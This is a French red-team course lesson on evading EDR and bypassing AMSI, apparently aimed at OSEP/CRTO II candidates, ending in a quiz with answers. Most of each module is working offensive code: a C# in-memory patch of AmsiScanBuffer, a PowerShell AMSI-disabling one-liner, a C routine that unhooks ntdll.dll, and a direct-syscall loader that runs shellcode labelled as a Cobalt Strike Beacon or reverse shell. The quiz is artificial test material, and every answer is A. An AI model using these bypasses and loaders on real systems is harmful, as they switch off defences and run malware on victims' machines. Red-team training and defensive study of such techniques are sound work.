# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 261 (6h) : EDR Evasion & AMSI Bypass (Memory Injection, API Unhooking, Obfuscation PowerShell/C# & Direct System Calls Syswhispers)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques avancées d'**évasion d'EDR (Endpoint Detection and Response) et de bypass d'AMSI (Antimalware Scan Interface)** ciblées par les certifications **CRTO II** et **OSEP (Offensive Security Experienced Penetrator)** : contourner AMSI en mémoire via patching de `AmsiScanBuffer`, effectuer l'unhooking de DLLs utilisateur (`ntdll.dll`), utiliser des **Direct System Calls (SysWhispers3)** pour éviter les hooks EDR, et masquer l'exécution de stagers PowerShell/C#.
>
> **Compétences visées :** `RED-04` (A) — EDR Evasion & AMSI Bypass | `OFF-04` (A) — Direct Syscalls & Memory Injection

---

## 1) Module — AMSI Bypass & Memory Patching (1h30)

### 📖 Narration/Intuition

L'**Antimalware Scan Interface (AMSI)** est une interface standard de Microsoft Windows qui permet aux applications (PowerShell, VBScript, WMI, .NET) d'envoyer leurs scripts en clair à l'antivirus/EDR installé avant toute exécution. Pour contourner AMSI, l'attaquant patche en mémoire la fonction `AmsiScanBuffer` dans la DLL `amsi.dll` chargée dans son propre processus, forçant la fonction à toujours retourner un code de succès (`AMSI_RESULT_CLEAN`).

### 🛠️ Atelier Pratique

**AMSI Patching en C# et PowerShell (`amsi_bypass.cs`) :**

```csharp
using System;
using System.Runtime.InteropServices;

public class AMSIBypass {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass() {
        IntPtr amsiDll = LoadLibrary("amsi.dll");
        IntPtr amsiScanBufferPtr = GetProcAddress(amsiDll, "AmsiScanBuffer");

        // Patch x64 : mov eax, 0x80070005 (E_ACCESSDENIED) ; ret
        byte[] patch = new byte[] { 0xB8, 0x05, 0x00, 0x07, 0x80, 0xC3 };

        uint oldProtect;
        // Changer la protection mémoire en PAGE_EXECUTE_READWRITE (0x40)
        VirtualProtect(amsiScanBufferPtr, (UIntPtr)patch.Length, 0x40, out oldProtect);

        // Écrire le patch en mémoire
        Marshal.Copy(patch, 0, amsiScanBufferPtr, patch.Length);

        // Restaurer la protection mémoire d'origine
        VirtualProtect(amsiScanBufferPtr, (UIntPtr)patch.Length, oldProtect, out oldProtect);

        Console.WriteLine("[+] AMSI patché avec succès ! Les scripts malveillants ne sont plus analysés.");
    }
}
```

```powershell
# Commande PowerShell d'activation du bypass AMSI en mémoire (one-liner obfusqué)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 2) Module — API Unhooking & Ntdll Reloading (2h)

### 📖 Narration/Intuition

La plupart des EDRs du marché (CrowdStrike, SentinelOne, Defender for Endpoint) injectent leur propre DLL dans chaque processus utilisateur pour **hooker les API Win32/NT Native** (ex: `NtCreateThreadEx`, `NtAllocateVirtualMemory`). L'**API Unhooking** consiste à recharger depuis le disque une copie "propre" de `ntdll.dll` et à réécrire la section `.text` en mémoire du processus pour écraser les hooks `JMP` de l'EDR.

### 🛠️ Atelier Pratique

**Unhooking de `ntdll.dll` en C (`unhook_ntdll.c`) :**

```c
#include <windows.h>
#include <stdio.h>

void UnhookNtdll() {
    HANDLE process = GetCurrentProcess();
    MODULEINFO mi = { 0 };

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    GetModuleInformation(process, hNtdll, &mi, sizeof(mi));
    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;

    // Charger une copie fraîche de ntdll.dll depuis le disque C:\Windows\System32\ntdll.dll
    HANDLE ntdllFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + dosHeader->e_lfanew);

    // Trouver la section .text
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (!strcmp((char*)sectionHeader->Name, ".text")) {
            DWORD oldProtect = 0;
            // Rendre la section .text d'origine inscriptible
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            // Copier la section .text d'origine (sans hooks) sur la section hookée en mémoire
            memcpy((LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize);

            // Restaurer la protection originale
            VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + sectionHeader->VirtualAddress), sectionHeader->Misc.VirtualSize, oldProtect, &oldProtect);
        }
    }
    printf("[+] ntdll.dll unhookée avec succès ! Les hooks EDR ont été écrasés.\n");
}
```

---

## 3) Module — Direct System Calls avec SysWhispers3 (2h30)

### 📖 Narration/Intuition

Plutôt que d'appeler les fonctions Win32 (`CreateRemoteThread`) ou NT Native (`NtCreateThreadEx`) qui risquent d'être hookées par l'EDR, les **Direct System Calls** permettent d'exécuter l'instruction assembleur `syscall` (ou `sysenter`) directement depuis le code de l'attaquant en insérant dynamiquement le numéro de syscall (**SSN - System Service Number**).

### 🛠️ Atelier Pratique

**Génération de Syscalls avec SysWhispers3 et injection Shellcode (`syscall_loader.c`) :**

```bash
# Générer les wrappers syscalls avec SysWhispers3 (supporte Egg Hunter & Halo's Gate)
python3 syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls
# Fichiers générés : syscalls.h, syscalls.c, syscalls_stubs.x64.asm
```

```c
#include <windows.h>
#include "syscalls.h"

// Shellcode d'exemple (Cobalt Strike Beacon ou Reverse Shell)
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00...";

int main() {
    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddress = NULL;
    SIZE_T regionSize = sizeof(shellcode);
    HANDLE hThread = NULL;

    // 1) Direct Syscall : Allocation de mémoire dans le processus
    Sw3NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 2) Direct Syscall : Écriture du shellcode en mémoire
    Sw3NtWriteVirtualMemory(hProcess, baseAddress, shellcode, sizeof(shellcode), NULL);

    // 3) Direct Syscall : Création du thread d'exécution
    Sw3NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);

    printf("[+] Shellcode exécuté via Direct Syscalls (bypass complet des hooks EDR utilisateur !)\n");
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **AMSI** | Antimalware Scan Interface — API Microsoft d'analyse de scripts en mémoire |
| **EDR** | Endpoint Detection and Response — Agent de sécurité analysant les comportements système |
| **CRTO II** | Certified Red Team Operator II — Certification Red Team avancée dédiée à l'évasion EDR |
| **OSEP** | Offensive Security Experienced Penetrator — Certification OffSec spécialisée en EDR Evasion |
| **SSN** | System Service Number — Numéro d'index d'un appel système (syscall) dans le noyau Windows |
| **SysWhispers** | Outil open-source de génération d'appels système directs (Direct Syscalls) pour Windows |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle fonction de la DLL `amsi.dll` est la cible principale des patches mémoire pour désactiver AMSI dans une session PowerShell ?
- A) `AmsiScanBuffer`
- B) `AmsiInitialize`
- C) `AmsiClose`
- D) `AmsiOpenSession`

**Réponse : A**

**Q2 :** Pourquoi la technique d'**API Unhooking** réécrit-elle la section `.text` de `ntdll.dll` en mémoire avec une copie originale lue depuis le disque ?
- A) Pour écraser les instructions d'inspections `JMP` réinjectées par l'agent EDR dans l'espace mémoire utilisateur du processus
- B) Pour accélérer le processeur
- C) Pour chiffrer le binaire
- D) Pour effacer les journaux Event Viewer

**Réponse : A**

**Q3 :** Quel est le principal avantage des **Direct System Calls** (générés par SysWhispers) par rapport à l'utilisation des fonctions API Windows standard ?
- A) Ils contournent l'inspection des hooks EDR posés dans l'espace utilisateur (`user-land hooks`) en exécutant directement l'instruction `syscall` avec le SSN approprié
- B) Ils fonctionnent sans droits administrateur
- C) Ils compressent la taille du shellcode
- D) Ils suppriment le besoin de réseau

**Réponse : A**

**Q4 :** Dans une attaque par patching d'AMSI, quelle constante de protection mémoire de l'API Windows `VirtualProtect` est nécessaire pour permettre l'écriture sur la fonction `AmsiScanBuffer` ?
- A) `PAGE_EXECUTE_READWRITE` (0x40)
- B) `PAGE_NOACCESS`
- C) `PAGE_READONLY`
- D) `PAGE_GUARD`

**Réponse : A**

**Q5 :** Quelle certification OffSec est spécifiquement dédiée au bypass d'antivirus, d'EDR et à l'exploitation Evasion avancée ?
- A) OSEP (Offensive Security Experienced Penetrator)
- B) OSCP
- C) OSWP
- D) OSED

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
